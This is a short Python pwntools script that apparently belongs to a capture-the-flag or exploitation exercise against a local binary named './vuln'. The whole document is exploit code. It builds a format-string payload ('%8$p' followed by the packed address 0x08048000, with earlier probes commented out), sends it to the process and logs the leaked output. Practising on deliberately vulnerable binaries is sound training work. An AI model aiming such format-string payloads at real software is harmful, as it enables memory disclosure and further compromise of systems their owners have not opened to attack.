#!/usr/bin/python3
from pwn import *

p = process('./vuln')

payload = flat(
    # 0x41424344,
    # b'|%6$p'
    b'%8$p||||',
    0x08048000,
)

p.sendline(payload)
log.info(p.clean())
